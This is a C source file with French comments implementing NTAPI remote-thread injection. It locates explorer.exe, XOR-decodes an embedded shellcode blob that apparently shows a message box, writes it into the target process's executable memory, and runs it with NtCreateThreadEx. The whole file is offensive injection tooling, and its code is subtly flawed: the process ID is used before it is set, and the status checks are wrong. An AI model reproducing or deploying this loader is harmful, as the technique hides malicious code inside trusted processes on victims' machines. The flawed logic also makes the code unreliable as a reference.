#include <stdio.h>
#include <windows.h>
#include "ntapi_injection_header.h"

//define err(...) printf(("[x] Erreur : ") GetLastError() ("avec la fonction "##__VA_ARGS__))

//NTAPI remote thread injection 

//fonction xor
BOOL XorFunc(unsigned char * shellcode, unsigned char bKey, size_t ShellSize){
    for (int i = 0; i < ShellSize; i++){
        shellcode[i] = shellcode[i] ^ bKey; 
    }
    return TRUE; 
}
BOOL ReportError(unsigned char* ApiName){
    printf("Erreur [%s] => code : %d\n", ApiName, GetLastError()); 
    return FALSE; 
}
//Find process PID
int FindMyProc(){
    
    //pointeur de fonction sur cette fonction car c'est un NativeApi
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
    ULONG ReturnLen = 0; //buffer qui récupère la taille nécessaire pour stocker les infos du système, on l'utulisera pour allouer la mémoire nécessaire pour stocker les infos du système
    PVOID pValueToFree = NULL; //on créer une variable qui va nous servir à libérer la mémoire alloué
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL; //variable qui va stocker les infos des processus du système, on l'utilisera pour faire une boucle et trouver notre processus cible
    WCHAR* ProcName = L"explorer.exe"; //notre processus cible 
    DWORD PID = 0;
    NTSTATUS STATUS; 
    //initialisation des parametres : 
    //on alloue ce pointeur a la fonction NtQuerytruc
    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
    //on doit allouer de la place. Comme on ne sait pas ce qu'il nous faut on appelle la fonction une fois avec le NULL au niveau du buffer ce qui va nous donner la taille
    /*Le problème ici : tu veux récupérer une liste de structures système (ex : processus), 
    mais tu ne connais pas à l’avance la taille mémoire nécessaire. 
    Donc tu dois d’abord demander au système : combien de mémoire faut-il ?*/
    /*-----------début de la recherche------------------*/
    //on récupère la taille du buffer grace a une erreur 
    STATUS = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)5, NULL, 0, &ReturnLen); 
    
    //on alloue la mémoire avec HeapAlloc avec la taille qu'on a récupéré,
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size_t)ReturnLen);
     if(SystemProcInfo == NULL){
        ReportError("SystemProcInfo");
        return 0; 
        }
        pValueToFree = SystemProcInfo;
        
        //on re init la fonction avec la bonne taille qu'on a alloué avec HeapAlloc, 
        //cette fonction va remplir le buffer avec les infos du système, 
        //on stocke le résultat dans STATUS pour vérifier si ça a fonctionné ou pas
        STATUS = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)5, SystemProcInfo, ReturnLen, &ReturnLen);        
        if(STATUS != 0){
            ReportError("pNtQuerySystemInformation");
            HeapFree(GetProcessHeap(), 0, pValueToFree);
            return EXIT_FAILURE; 
        }
    /*---------------------début de l'énumaration---------------------*/
        
    while(TRUE){
        //liste chainnée on va analyser chaque process et aller au suivant tant qu'on ne trouve pas ce qu'on cherche 
        //notre valeur a comparé est ProcName
        if(SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0){
           PID = (DWORD)(ULONG_PTR)SystemProcInfo->UniqueProcessId;
           printf("on a bien trouve notre target ! - PID : %d \n", PID);   
            break; 
        }
        
        //On vérifie qu'il n'y ai pas d'autre ékéments. Si on a pas d'élément suivant on break et on quitte le programme
        if(!SystemProcInfo->NextEntryOffset)
        break;
    //sinon on bouge à la prochaine structure. Comme c'est une liste chainée, 
    //on ajoute à l'adresse de la structure actuelle la valeur de NextEntryOffset pour aller à la prochaine structure.
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR) SystemProcInfo + SystemProcInfo->NextEntryOffset);
 
    }
//on clean avec HeapFree: 
HeapFree(GetProcessHeap(), 0, pValueToFree); 
//check si on a bien récupérer le bon PID 
    if(PID == NULL) {
        printf("on a pas trouve notre target :( \n");
        return FALSE; 
    }
    else  
        //la valeur de retour est le PID 
        printf("on a trouvé notre target :) \n");
        return PID;
    }
//
//fonction cryp en xor
void EncryptXor(unsigned char key, unsigned char *buf, int size) {
    for (int i = 0; i < size; i++) {
        buf[i] ^= key;
    }
}


int main(int argc, char * argv[]){
unsigned char shellcode [] = 
"\xec\x58\x91\xf4\xe0\xef\xef\xef\xf8\xdc\x10\x10\x10\x51\x41\x51"
"\x40\x42\x41\x58\x21\xc2\x75\x58\x9b\x42\x70\x58\x9b\x42\x08\x58"
"\x9b\x42\x30\x46\x58\x9b\x62\x40\x5d\x21\xd9\x58\x1f\xa7\x5a\x5a"
"\x58\x21\xd0\xbc\x2c\x71\x6c\x12\x3c\x30\x51\xd1\xd9\x1d\x51\x11"
"\xd1\xf2\xfd\x42\x51\x41\x58\x9b\x42\x30\x9b\x52\x2c\x58\x11\xc0"
"\x76\x91\x68\x08\x1b\x12\x1f\x95\x62\x10\x10\x10\x9b\x90\x98\x10"
"\x10\x10\x58\x95\xd0\x64\x77\x58\x11\xc0\x9b\x58\x08\x54\x9b\x50"
"\x30\x40\x59\x11\xc0\xf3\x46\x5d\x21\xd9\x58\xef\xd9\x51\x9b\x24"
"\x98\x58\x11\xc6\x58\x21\xd0\xbc\x51\xd1\xd9\x1d\x51\x11\xd1\x28"
"\xf0\x65\xe1\x5c\x13\x5c\x34\x18\x55\x29\xc1\x65\xc8\x48\x54\x9b"
"\x50\x34\x59\x11\xc0\x76\x51\x9b\x1c\x58\x54\x9b\x50\x0c\x59\x11"
"\xc0\x51\x9b\x14\x98\x58\x11\xc0\x51\x48\x51\x48\x4e\x49\x4a\x51"
"\x48\x51\x49\x51\x4a\x58\x93\xfc\x30\x51\x42\xef\xf0\x48\x51\x49"
"\x4a\x58\x9b\x02\xf9\x5b\xef\xef\xef\x4d\xf8\x1b\x10\x10\x10\x65"
"\x63\x75\x62\x23\x22\x3e\x74\x7c\x7c\x10\x49\x51\xaa\x5c\x67\x36"
"\x17\xef\xc5\x59\xd7\xd1\x10\x10\x10\x10\xf8\x02\x10\x10\x10\x58"
"\x71\x73\x7b\x30\x44\x78\x75\x30\x40\x7c\x71\x7e\x75\x64\x30\x31"
"\x10\x4a\xf8\x15\x10\x10\x10\x58\x51\x58\x51\x10\x51\x48\x58\x21"
"\xd9\x51\xaa\x55\x93\x46\x17\xef\xc5\x58\x21\xd9\x51\xaa\xe0\xa5"
"\xb2\x46\xef\xc5";

int shell_size = sizeof(shellcode) - 1; // enlève le \x00 final
unsigned char bkey = 0x10; // clé XOR
HANDLE hProcess = 0; 
HANDLE hthread = 0; 
DWORD PID = 0;
//init des variables pointeurs de fonctions NtAPI
fnNtOpenProcess pOpenProcess;
fnNtAllocateVirtualMemory pAllocateVirtualMemory; 
fnNtWriteVirtualMemory pWriteVirtualMemory; 
fnNtCreateThreadEx pCreateThreadEx;

//ici on initialise ces variables car NtCreateThread et NtOpenProcess ont besoin de pointeurs sur ces structures pour récupérer des informations. Ici on n'a initialiser que les éléments de ces structures dont on a besoin. ((HANDLE)PID et sizeof(OA)) par exemple. 

CLIENT_ID CID = { (HANDLE)PID, NULL };
OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};

 
PID = FindMyProc(); 
NTSTATUS STATUS = 0;
PVOID ShellcodeAddress = NULL; 
SIZE_T ShellSize = sizeof(shellcode); 

EncryptXor(bkey, shellcode, shell_size);

//on ouvre le process et on récupère le handle
pOpenProcess = (fnNtOpenProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenProcess");
STATUS = pOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
if(STATUS == EXIT_FAILURE){
    printf("Erreur avec pOpenProcess : %d\n", GetLastError());
}

//on alloue de la mémoire pour le shellcode.
pAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
STATUS = pAllocateVirtualMemory(hProcess, &ShellcodeAddress, NULL, &ShellSize,(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
if(STATUS == EXIT_FAILURE){
    printf("Erreur avec pAllocateVirtualMemory : %d\n", GetLastError());
}
//on écris dans cette mémoire
pWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtWriteVirtualMemory");
STATUS = pWriteVirtualMemory(hProcess, ShellcodeAddress, shellcode, ShellSize, NULL);
if(STATUS == EXIT_FAILURE){
    printf("Erreur avec pWriteVirtualMemory : %d\n", GetLastError());
}

pCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
STATUS = pCreateThreadEx(&hthread, THREAD_ALL_ACCESS, &OA, hProcess , (PTHREAD_START_ROUTINE)ShellcodeAddress,  NULL, 0, 0, 0, 0, NULL);
if(STATUS == EXIT_FAILURE){
    printf("Erreur avec pCreateThreadEx : %d\n", GetLastError());
}
    return EXIT_SUCCESS; 
}



